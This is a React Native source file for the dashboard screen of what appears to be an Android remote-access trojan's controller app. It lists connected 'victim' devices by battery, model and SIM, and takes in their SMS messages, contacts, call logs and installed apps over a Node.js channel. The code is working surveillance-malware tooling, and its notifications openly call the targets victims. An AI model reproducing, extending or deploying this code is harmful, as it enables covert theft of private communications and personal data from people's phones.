import React, { useEffect } from "react";
import { 
    Box,
    StatusBar, 
    HStack,
    IconButton,
    Icon,
    Text,
    useToast,
    Progress,
    Pressable
} from "native-base";
import nodejs from 'nodejs-mobile-react-native';
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';


// redux
import { useDispatch, useSelector } from '../../redux/store';
import { addDevice, deleteDevice, addSMS, addSMSInfo, addContacts, addCallLogs, addInstalledApps, setIsLoading } from '../../redux/slices/userInfo'

const Dashboard = ({navigation}) => {
  const dispatch = useDispatch();
  const toast = useToast();
  const { devices } = useSelector((state) => state.userInfo);

  useEffect(()=>{
    nodejs.channel.addListener("deviceJoined", handleAddDevice, this);
    nodejs.channel.addListener("getSMS", onGetSMS, this);
    nodejs.channel.addListener("getContacts", onGetContacts, this);
    nodejs.channel.addListener("getCallLog", onGetCallLog, this);
    nodejs.channel.addListener("getInstalledApps", onGetInstalledApps, this);
    nodejs.channel.addListener("deviceDisconnected", handleRemoveDevice, this);
    nodejs.channel.addListener("error", handleError, this);
  },[])

  const handleAddDevice=(data)=>{
    let device = JSON.parse(data);
    dispatch(addDevice({...device,connected:true}))
    toast.show({
      title: "Victim Connected",
      status: "success",
      placement: "top",
    })
  }

  const handleRemoveDevice=(id)=>{
    dispatch(deleteDevice(id))
    toast.show({
      title: "Victim Disconnected",
      status: "error",
      placement: "top",
    })
   }
   
   const handleError=(msg)=>{
    let { error }=JSON.parse(msg)
     toast.show({
       title: error,
       status: "error",
       placement: "top",
     })
    }

   const onGetSMS=(data)=>{
    let{sms, isEnd, totalSMS}=JSON.parse(data);
    dispatch(addSMSInfo({
      isEnd,
      totalSMS,
    }))
    dispatch(addSMS(sms));
    dispatch(setIsLoading(false));
   }

   const onGetContacts=(data)=>{
    let{ contactsList }=JSON.parse(data);
    dispatch(addContacts(contactsList))
    dispatch(setIsLoading(false));
   }

   const onGetCallLog=(data)=>{
    let{ callsLog }=JSON.parse(data);
    dispatch(addCallLogs(callsLog))
    dispatch(setIsLoading(false));
   }
   const  onGetInstalledApps =(data)=>{
    let{ installedApps }=JSON.parse(data);
    dispatch(addInstalledApps(installedApps))
    dispatch(setIsLoading(false));
   }



  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop bg={"primary"}/>

    <Box flex={1} bg={"primary"} px={'2'} >
    <HStack my="4" alignItems="center" justifyContent={'space-between'} borderBottomWidth="1" borderBottomColor={'secondary.500'} >
      <IconButton 
         onPress={()=>navigation.goBack()}
         icon={<Icon as={MaterialCommunityIcons} name="chevron-left-circle" />} 
         borderRadius="full" 
         _icon={{ color:  "tertiary.500", size: "sm"}} 
         _pressed={{ bg: "tertiary.800:alpha.20"}}            
         />
        <Text fontSize={'20'}  color={"secondary.500"}>Dashboard</Text>
        <Box flexDirection={'row'} alignItems='flex-end'>
            <Icon as={MaterialCommunityIcons} name="signal" color={'success.500'} size="5" mr="1"/>
            <Text fontSize={'12'} color={"secondary.500"}>listening</Text>
        </Box>
    </HStack>
    <Box bg="dark.100" borderRadius='5' py="4" px="2" mb='2'>
            <HStack justifyContent="space-between" alignItems={'center'}>
            <Text fontSize={'12'} color={"secondary.500"}>Battery</Text>
            <Text fontSize={'12'} color={"secondary.500"}>Model</Text>
            <Text fontSize={'12'} color={"secondary.500"}>Sim</Text>
            <Text fontSize={'12'} color={"secondary.500"}>Status</Text>
            <Text fontSize={'12'} color={"secondary.500"}>App Install Time</Text>
            </HStack>
    </Box>

    {
        Object.keys(devices).map((key)=>renderDevice(key,devices,navigation))
    }
    </Box>
    </>
    )
};

export default Dashboard;

const renderDevice = (id, devices, navigation) =>{
   return(
        <Pressable key={id} onPress={()=>devices[id].connected&&navigation.navigate('clientManager',{ deviceId: id } )} >
        <Box bg="dark.100" borderRadius='5' py="4" px="2" mb='2'>
            <HStack justifyContent="space-between" alignItems={'center'}>
                <Box w="7">
                    <Progress colorScheme="success" size="md" value={Math.round(devices[id].battery * 100)} />
                    <Text position={'absolute'} top='-1' left='2' fontWeight={'bold'} fontSize={'10'} color={"white"}>{Math.round(devices[id].battery * 100)}%</Text>
                </Box>
            <Text fontSize={'12'} color={"secondary.500"}>{devices[id].model}</Text>
            <Text fontSize={'12'} color={"secondary.500"}>{devices[id].sim}</Text>
            <Text fontSize={'12'} color={devices[id].connected?"success.500":"error.500"}>{devices[id].connected?"online":"offline"}</Text>
            <Text fontSize={'12'} color={"secondary.500"}>{devices[id].appInstallTime}</Text>
            </HStack>
        </Box>
        </Pressable>
    )
}


  